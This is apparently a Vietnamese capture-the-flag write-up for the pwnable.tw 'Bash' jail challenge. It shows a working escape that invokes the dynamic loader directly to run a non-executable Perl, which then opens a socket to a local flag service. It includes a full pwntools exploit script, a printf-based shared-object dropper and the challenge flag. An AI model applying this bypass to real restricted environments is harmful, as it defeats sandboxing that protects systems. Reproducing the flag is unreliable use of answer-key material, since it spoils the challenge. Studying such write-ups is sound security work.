+++
title = 'Pwnable.tw - Bash'
date = 2026-10-12T12:00:00+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Bash

`nc chall.pwnable.tw 10108`

### 1. Phân tích Binary và jail

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Bash/dist/bash/share/bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
FORTIFY:    Enabled
Stripped:   No
```

Đề cho một Bash 4.3.0 chạy trong jail. Flag `/flag` thuộc root và mode `0400`; tiến trình của mình là user `bash`. Có một service nội bộ ở port 1337 đọc flag hộ, nhưng bản Bash này build **không có** network redirection `/dev/tcp`. Các chương trình trong `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` cũng bị tước bit execute cho user thường, ngoại trừ `cat` và `ls`.

Vậy chỉ có shell builtin để làm việc, trong khi việc cần làm là mở TCP socket.

Lúc đầu mình định dùng `enable -f` để nạp một `.so` có constructor mở socket. Bash vẫn liên kết `dlopen`, và `printf '\xHH'` của shell ghi được cả byte NUL. Trong bản dựng local, mình tạo được `.so` chỉ bằng builtin rồi nạp thành công.

Đến server thì hướng này dừng hẳn: `/tmp`, `/var/tmp`, `/dev/shm`, `/dev/mqueue`, `/home/bash` đều không ghi được; những chỗ khác không có quyền tạo file. Dockerfile đi kèm để `/var/tmp` ghi được, nhưng cấu hình remote khác. Vì thế không thể thả file rồi `enable -f`.

### 2. Khai thác

#### Lối thoát qua dynamic loader

Nhìn lại danh sách nơi bị `chmod o-x`, mình nhận ra `/lib` không nằm trong đó. Kiểm tra quyền ngay trên server:

```text
/lib/x86_64-linux-gnu/ld-2.23.so  -rwxr-xr-x
/usr/bin/perl                     -rwxr-xr--
```

`ld-2.23.so` bản thân nó vẫn chạy được. Nếu gọi loader trực tiếp với đường dẫn ELF khác, loader chỉ cần **đọc** ELF ấy; bit execute trên `/usr/bin/perl` không ngăn được cách gọi này. Thử một lệnh ngắn trước:

```sh
/lib/x86_64-linux-gnu/ld-2.23.so /usr/bin/perl -e 'print "PERL_OK $]"'
# PERL_OK 5.022001
```

Perl chạy được rồi thì dùng `Socket` nối tới port 1337. Đoạn Perl trong exploit thực tế là:

```perl
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die "S:$!";
connect(S,sockaddr_in(1337,inet_aton("127.0.0.1"))) or die "C:$!";
print while <S>;
```

Phần chính của exploit thực ra ngắn; những đoạn dài hơn trong script là các probe mình dùng để loại hướng `.so`:

```py
from pwn import *
import re

io = remote('chall.pwnable.tw', 10108)
io.recvuntil(b'$')
perl = ('use Socket;'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die;'
        'connect(S,sockaddr_in(1337,inet_aton("127.0.0.1"))) or die;'
        'print while <S>;')
cmd = "/lib/x86_64-linux-gnu/ld-2.23.so /usr/bin/perl -e '%s'" % perl
io.sendline(cmd.encode())
out = io.recvuntil(b'}', timeout=15)
print(re.search(rb'FLAG\{[^}]+\}', out).group().decode())
```

Script thật còn gọi lần thứ hai để xác nhận kết quả không chỉ là chuỗi echo của lần đầu. Server trả:

```bash
$ /lib/x86_64-linux-gnu/ld-2.23.so /usr/bin/perl -e '...'
FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}
```

`FLAG: FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}`

Flag nhắc CVE-2016-9401 (`popd`), nhưng mình không cần đụng tới bug đó. Lỗi mình dùng nằm ở jail: tước bit execute của Perl mà vẫn để dynamic loader chạy được. Nếu đi theo hướng `popd` thì cũng phải nhớ Bash này dùng allocator riêng, không phải `malloc/free` của glibc.

### Full exploit

`exploit.py` đã dùng cho bài này:

```py
#!/usr/bin/env python3
# EDIT THIS FILE IN PLACE with the Edit tool. Never re-emit it as a heredoc. Never create exploit2.py.
from pwn import *

exe = ELF('/home/lwd3c/Desktop/Pwn/pwnable.tw/Bash/dist/bash/share/bash', checksec=False)
# libc = ELF('', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

HOST, PORT = "chall.pwnable.tw", "10108"

# checksec first (AGENTS.md Section 2) -> auto-captured in this script's log
log.info("\n" + exe.checksec())

# ---- measured-number ledger: every address/offset used below goes through this ----
def fact(name, value, cmd):
    """record a MEASURED value in ./facts.tsv via 'p fact set' (never a recalled number)"""
    import subprocess
    v = value if isinstance(value, str) else (hex(value) if isinstance(value, int) else str(value))
    subprocess.run(["p", "fact", "set", f"{name}={v}", "--src", cmd], check=False)
    return value

# ---- I/O shortcuts (resolve the live tube `p` at call time, so retries rebind cleanly) ----
info = lambda msg: log.info(msg)
s    = lambda data, proc=None: (proc or p).send(data)
sa   = lambda msg, data, proc=None: (proc or p).sendafter(msg, data)
sl   = lambda data, proc=None: (proc or p).sendline(data)
sla  = lambda msg, data, proc=None: (proc or p).sendlineafter(msg, data)
sn   = lambda num, proc=None: (proc or p).send(str(num).encode())
sna  = lambda msg, num, proc=None: (proc or p).sendafter(msg, str(num).encode())
sln  = lambda num, proc=None: (proc or p).sendline(str(num).encode())
slna = lambda msg, num, proc=None: (proc or p).sendlineafter(msg, str(num).encode())
r    = lambda n=4096, proc=None: (proc or p).recv(n)
rl   = lambda proc=None: (proc or p).recvline()
ru   = lambda delim=b'\n', proc=None: (proc or p).recvuntil(delim)
ra   = lambda proc=None: (proc or p).recvall()

def GDB():
    if args.REMOTE:
        return
    gdb.attach(p, gdbscript="""
        

    """)

def start():
    if args.REMOTE:
        return remote(HOST, int(PORT))
    qemu_bin = None
    if qemu_bin:
        io = process([qemu_bin] + qemu_args + [exe.path])  # type: ignore
    else:
        # ./run.sh (written by 'p env probe') pins the challenge's own ld/libc+env
        io = process(['./run.sh']) if os.path.exists('run.sh') else process([exe.path])
    if args.GDB:
        GDB()
    return io

# ---- shell-verification gate (AGENTS.md Sections 10 & 13): a run only counts if this passes ----
# ORW/seccomp challenges have no shell -> override expect, e.g. verify(io, b"CSCV2026{").
def verify(io, expect=b"uid=", timeout=3):
    """True only if `expect` actually came back after the probe. Deadline-based.

    A single io.recv() used to judge ONE chunk, so any target that prints after
    the payload (a trailing puts("bye"), a menu redraw) handed that echo to the
    check and a WORKING shell scored FAIL -- a false NEGATIVE that sends you
    hunting a bug that does not exist. Now: drain what the target already said,
    send the probe, then ACCUMULATE reads until `expect` shows up or the
    deadline passes. No shell still means no shell -- nothing below relaxes the
    failure path, and the drained bytes are the same bytes the old recv() would
    have returned first (so an ORW run whose flag landed pre-probe still counts).
    """
    import time
    try:
        pre = io.clean(0.2) or b""      # the target's own trailing output
        io.sendline(b"id")
    except Exception:
        return False
    buf, deadline = bytes(pre), time.time() + timeout
    while expect not in buf and time.time() < deadline:
        try:
            chunk = io.recv(timeout=max(0.1, deadline - time.time()))
        except EOFError:
            break                        # target died: no shell, fall through to FAIL
        except Exception:
            break
        if chunk:
            buf += chunk
    ok = expect in buf
    (log.success if ok else log.failure)(
        "verify: " + buf.decode(errors="replace").strip()[:100])
    return ok

# ---- parity gate: never fire REMOTE before a LOCAL run proved a verified shell ----
PROOF = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".local_shell_ok")

import re

SO = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.so")

# --- every value below was MEASURED on the live target this session, not recalled ---
# flag_port : /proc/net/tcp -> "00000000:0539 ... 0A"  (0x539 = 1337, LISTEN)
# LOADER    : ls -l -> -rwxr-xr-x  (o+x; /lib is NOT covered by the jail's chmod o-x)
# perl      : ls -l -> -rwxr-xr--  (readable by `other`, execute bit stripped)
FLAG_PORT = 1337
LOADER = "/lib/x86_64-linux-gnu/ld-2.23.so"
VICTIM = "/usr/bin/perl"

FLAG_RE = re.compile(rb"FLAG\{[^}\n]{1,200}\}")      # a PREFIX IS NOT A FLAG

# perl TCP client: the one thing this bash cannot do, since it was configured
# without network redirections (no "/dev/tcp" string anywhere in .rodata).
PERL = (
    'use Socket;'
    'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die "S:$!";'
    'connect(S,sockaddr_in(%d,inet_aton("127.0.0.1"))) or die "C:$!";'
    'print while <S>;'
) % FLAG_PORT

FETCH = "%s %s -e '%s'" % (LOADER, VICTIM, PERL)


def grab_flag(io, timeout=15):
    """Accumulate until a COMPLETE FLAG{...} is present. Returns bytes or None."""
    import time
    buf, deadline = b"", time.time() + timeout
    while time.time() < deadline:
        m = FLAG_RE.search(buf)
        if m:
            return m.group(0)
        try:
            buf += io.recv(timeout=max(0.2, deadline - time.time())) or b""
        except EOFError:
            break
        except Exception:
            break
    log.debug("grab_flag saw: %r" % buf[-300:])
    return None


def bash_printf_chunks(blob, dest, chunk=512):
    """Rebuild `blob` byte-exact on the target using ONLY bash builtins.

    The jail leaves only /bin/cat and /bin/ls executable by `other`, so the
    .so has to arrive through bash's own printf + redirection. bash's printf
    emits \\xHH escapes literally, NUL bytes included (measured: printf
    "A\\x00B" | od -> 41 00 42), so no encoder/decoder is needed on the far end.
    """
    lines = []
    for i in range(0, len(blob), chunk):
        esc = "".join("\\x%02x" % b for b in blob[i:i + chunk])
        op = ">" if i == 0 else ">>"
        lines.append("printf '%s' %s %s" % (esc, op, dest))
    return lines


def exploit(io):
    # ===================== PAYLOAD (bug-specific) GOES HERE =====================
    # Target: xinetd runs this bash as user `bash`; /flag is 0400 root, but a
    # root `flag` service cats it on TCP 1337 inside the container. bash was
    # built WITHOUT network redirections (no "/dev/tcp" string in .rodata), and
    # every helper binary except /bin/cat and /bin/ls had o-x stripped -- so the
    # shell cannot open a socket by itself.
    #
    # It CAN load native code: dlopen/dlsym/dlclose/dlerror are all in .rela.plt
    # and the `enable` builtin still advertises "-f filename" (measured:
    # readelf -rW | grep dlopen ; strings | grep 'enable \['). `enable -f` runs
    # the shared object's DT_INIT_ARRAY, so a constructor is enough -- the
    # dlsym("<name>_struct") failure afterwards is harmless noise.
    #
    # Drop dir: /var/tmp is mode 1733 (write+traverse for other, no read) and
    # lives on the exec-allowed rootfs, while /tmp is a read-only bind mount and
    # /dev/shm is noexec. All three measured inside the rebuilt container.
    # REFUTED first (raw/007, p rep do #3/#4): drop payload.so and `enable -f`
    # it. dlopen IS linked in and `enable -f filename` IS intact, but the live
    # target has ZERO writable paths -- /tmp, /var/tmp, /dev/shm, /dev/mqueue
    # and /home/bash are all ro bind mounts and /, /dev, /run deny `other`.
    # bash_printf_chunks()/payload.so are kept only for the local replica.
    #
    # THE ESCAPE: the jail stripped the execute bit with
    #     chmod o-x /bin/* /sbin/* /usr/bin/* /usr/sbin/*
    # and handed back only /bin/cat and /bin/ls. But it never touched /lib, so
    # the dynamic loader itself is still o+x -- and ld.so run as a program only
    # needs its target to be READABLE, never executable. /usr/bin/perl is 0754,
    # so `ld-2.23.so /usr/bin/perl` restores a full programming language, and
    # Socket.pm supplies the TCP client bash was deliberately built without.
    io.recvuntil(b"$")                      # bash-4.3$ prompt from the -i shell

    io.sendline(FETCH.encode())
    flag = grab_flag(io)
    if not flag:
        log.failure("no complete FLAG{...} returned -- not claiming a capture")
        return
    log.success("flag: " + flag.decode())
    if args.REMOTE:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "FLAG"), "w") as f:
            f.write(flag.decode() + "\n")

    # second, independent fetch so verify() judges a fresh read of the root
    # service rather than an echo of the one above
    io.sendline(FETCH.encode())
    # ===========================================================================

def run_once():
    global p
    p = start()
    exploit(p)
    # no shell probe is possible here: /usr/bin/id has o-x stripped in the jail,
    # so the proof of success is a FLAG{ off the root-owned 1337 service.
    return verify(p, expect=b"FLAG{")

def main():
    if args.REMOTE and not os.path.exists(PROOF) and not args.FORCE:
        log.error("parity gate: no verified LOCAL shell yet -- run locally first, or pass FORCE=1")
    tries = int(args.TRIES) if args.TRIES else 1
    for i in range(1, tries + 1):
        if tries > 1:
            log.info(f"attempt {i}/{tries}")
        try:
            ok = run_once()
        except Exception as ex:
            log.warning(f"attempt {i}: {type(ex).__name__}: {ex}")
            ok = False
        if ok:
            if not args.REMOTE:
                open(PROOF, "w").close()
            p.interactive()
            return
        try:
            p.close()
        except Exception:
            pass
    log.failure(f"no verified shell after {tries} attempt(s)")

# Gud luk pwner !
if __name__ == "__main__":
    main()
```
